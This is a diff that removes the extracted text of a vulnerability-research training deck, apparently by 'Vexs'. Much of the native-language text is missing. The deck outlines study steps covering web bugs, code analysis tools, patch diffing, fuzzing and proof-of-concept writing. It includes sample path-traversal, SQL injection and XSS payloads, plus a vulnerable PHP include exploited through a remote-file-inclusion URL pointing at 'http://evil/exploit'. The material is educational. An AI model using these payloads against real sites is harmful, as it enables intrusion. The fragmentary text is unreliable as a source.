@@ -1,304 +1,0 @@
-14
-Vexs
-
-Introduction
-· Google
-· g.cn -> www.google.cn -> www.google.com.hk · google.com -> www.google.com.hk · VPN www.google.com  · IP 74.125.128.13*
-·  ->  ->  ->  ->...->  ->  ·  ->  -> 
-· Google
-· 14
-· 14/21C++/21Java/21Linux C · Free 14 Day Trial
-· 1988-2012 25 Years of Vulnerabilities Sourcefire
-
-Tools or POC?
-
-High Severity(SF)
-
-Critical Severity(SF)
-
-Exploiting? NO!
-· Structured Exception Handler Overwrite Protection (SEHOP) · Data Execution Prevention (DEP) · Heapspray Allocations · Null page allocation · Mandatory Address Space Layout Randomization (ASLR) · Export Address Table Access Filtering (EAF) · Bottom-up randomization · ROP mitigations · Attack Surface Reduction · Advanced Mitigations for ROP and EAF
-· Linux kernel Grsecurity SELinux AppArmor
-
-Plan
-
-· 
-
-
-
-· 1: Web 8: 
-
-· 2: Web 9: 
-
-· 3: Web 10: Fuzzing
-
-· 4:  11: Fuzzing ActiveX
-
-· 5:  12: POC
-
-· 67:  1314: 
-
-1
-· Web
-· Tomcat IIS Jsp ASPX PHP Apache MySQL 
-· Cross-Site Scripting (XSS) Cross-Site Request Forgery (CSRF) · SQL Injection Code Execution File Inclusion CRLF Injection · DOM XSS Buffer Overflows · OWASP Top 10 & CWE/SANS Top 25 ·  
-· Web ·  DVWA WebGoat
-· +
-
-Vulnerabilities
-
-2
-· Web
-· Burp Suite Pro · 
-· ../../../../../../../../../../../../../../ · ../../../../../../../../../../../../../../../
-· /**/or/**/1/**/=/**/1 · /**/or/**/1/**/=/**/2 · =><><script>alert('XSS')</script> · =><><ScRiPt>AlErT('XSS')</ScRiPt> · 
-· Web ·  DVWA WebGoat
-·  Payload
-
-Testing
-
-3
-
-· Web
-· ASP/ASPX/JSP/PHP · //
-
-· <?php
-
-·
-
-$lang = 'English';
-
-·
-
-if ( isset( $_GET['LANG'] ) )
-
-·
-
-$lang = $_GET['LANG'];
-
-/vulnerable.php?LANG=http://evil/exploit
-
-·
-
-require( $lang . '.php' );
-
-/vulnerable.php?LANG=..\..\..\..\ftp\upload\exploit
-
-· ?>
-
-· <form>
-
-·
-
-<select name="LANG">
-
-·
-
-<option value="eng">English</option>
-
-·
-
-<option value="cht">Traditional Chinese</option>
-
-·
-
-</select>
-
-·
-
-<input type="submit">
-
-· </form>
-
-·  DVWA WebGoat +  ·  + 
-
-Entry Point
-
-4
-· C/C++
-· C/C++ · 
-· Buffer Overflow & Buffer Overflow: Format String & Buffer Overflow: Format String (%f/%F)
-· Buffer Overflow: Off-by-One & Buffer Overflow: Signed Comparison · Command Injection & Denial of Service & Format String & Illegal Pointer Value · Integer Overflow & LDAP Injection & LDAP Manipulation & Log Forging · Out-of-Bounds Read & Out-of-Bounds Read: Off-by-One · Out-of-Bounds Read: Signed Comparison & Path Manipulation · Process Control & Resource Injection & SQL Injection · Setting Manipulation & String Termination Error · String Termination Error(truncate) & Unsafe Reflection
-· Dangerous Function (Banned Functions) +  · 
-
-Input Validation
-
-5
-· C/C++
-·  · 
-· API usage errors & Code maintainability issues · Control flow issues & Error handling issues · Incorrect expression & Insecure data handling · Integer handling issues & Memory - corruptions · Memory - illegal accesses & Null pointer dereferences · Performance inefficiencies & Program hangs & Resource leaks · Security best practices violations & Uninitialized variables
-·  +  · 
-
-Flowgraph
-
-Analysis
-
-Source Code Analysis Tools
-
-· AppsCan Source
-
-·
-
-Java, JavaScript, JSP, ColdFusion, C, C++, Objective-C, .NET (C#, ASP.NET and VB.NET), Classic ASP (JavaScript/VBScript), PHP,
-
-Perl, VisualBasic 6, PL/SQL, T-SQL, SAP ABAP and COBOL
-
-· CodeSecure
-
-·
-
-ASP.NET, VB.NET, C#, Java/J2EE, JSP, EJB, PHP, Classic ASP and VBScript
-
-· Checkmarx
-
-·
-
-Java, C# / .NET, PHP, C, C++, Visual Basic 6.0, VB.NET, Flash, APEX, Ruby, Javascript, ASP, Perl, Android, Objective C, PL/SQL,
-
-HTML5.
-
-· Fortify
-
-·
-
-ABAP/BSP, ActionScript/MXML, ASP.NET, VB.NET, C#(.NET), C/C++, Classic ASP, COBOL, CFML, HTML, Java, JavaScript/AJAX,
-
-JSP, Objective-C, PHP, PL/SQL, Python, T-SQL, Visual Basic, VBScript, XML
-
-· Veracode
-
-·
-
-Java, JSP, .NET- C#, .NET - VB.NET, ASP.NET, .NET - C++/CLI, C/C++, PHP, ColdFusion, iOS, Android, J2ME, Ruby, Classic ASP,
-
-VB6, VBScript, Flash (using Dynamic)
-
-· Coverity
-
-·
-
-C/C++, Java and C#
-
-· Klocwork
-
-·
-
-C/C++, C#Java
-
-· Parasoft
-
-·
-
-C/C++(C/C++test), Java(Jtest), .NET(dotTEST)
-
-· CodeSonar
-
-·
-
-C/C++, Java, and binaries
-
-67
-· + · vulncat teamMentor(VPN) AppSource(Software)
-· Patchdiff · /
-· PHP/JavaStruts 2 & WebLogic · C#/Java · C/C++
-·  Nginx +  · 
-
-PHP
-
-Java
-
-C++
-
-8
-· 
-· IDA Pro + PatchDiff Plugins + Scripts · zynamics BinDiff Similarity · BinNavi    · .NET -> NET Reflector · Java Class -> Java Decompiler
-· D-Link Router Backdoor · 201448Windows XP SP3 Server 2003
-· KBArticleNumber /X:C:\ExtractedPackage
-· 
-
-PatchDiff
-
-Trace
-
-Variable
-
-Execute
-
-9
-· /
-· Windbg/ollydbg/EDB · Dynamic Binary Instrumentation
-· Pin/DrMemory/DynamoRIO/QEMU/Valgrind · Crash Dump(!exploitable Crash Analyzer)
-· Kernel Memory Space Analyzer · MemSherlock + CBones
-· Unpack/UPX · StrongOD/Themida/Winlicense/VMProtect · Windows/Linux
-
-Pin
-
-Unpack
-
-10
-· Fuzzing
-· beSTORMFuzzer + Monitor · 010 Editor + Peach Fuzzer · Browser Fuzzer
-· Browser fuzzing / NodeFuzz / Grinder · 802.XX/DNP3/MODBUS(SCADA)
-· PayloadFuzzing
-
-Web Server
-
-41414141?
-
-11
-· Fuzzing ActiveX
-· Fuzzing · ComRaiderActiveXFuzzing
-· 
-· ActiveXFuzzing
-
-ActiveX
-
-12
-· POC
-· nc+ packet MS12-20 · SQL Injection: SQL & Sqlmap · Cross-Site Scripting (XSS)HTML & URL · Code Execution Command
-· Buffer Overflow: C/C++ · PerlbeSTORM · RubyMetasploit
-· PythonCANVAS & CORE Impact & Exploit Pack
-· 
-
-POC
-
-1314
-· 
-· nginx site:exploit-db.com · apache site:exploit-db.com · nginx site:packetstormsecurity.org · apache site:packetstormsecurity.org · Microsoft Security Bulletin
-· 
-
-About
-· 
-· 
-· Vexs = Vulnerability exploits · http://t.qq.com/security-focus & vexs@x-bug.com
-· LSCSA Labs Creator · LSCSA = Linux Source Code Security Analysis
-· DBAPPSecurity Security Service · []
-· 14
-
-Security Research Labs
-
-· [] 
-
-·  · ISO/IEC ISMS SSE-CMM SP 800-30 CVE
-
-·  · Risk Assessment
-
-· APT
-
-Advanced Persistent Threat
-
-·  Penetration Testing
-
-· Web Web Security Vulnerabilities
-
-·  Source Code Security Analysis
-
-·  Binary Code Analysis
-
-·  Security Development Lifecycle (SDL)
-
-· 
-
-· Emergency Response & Evidence Collection
-
-
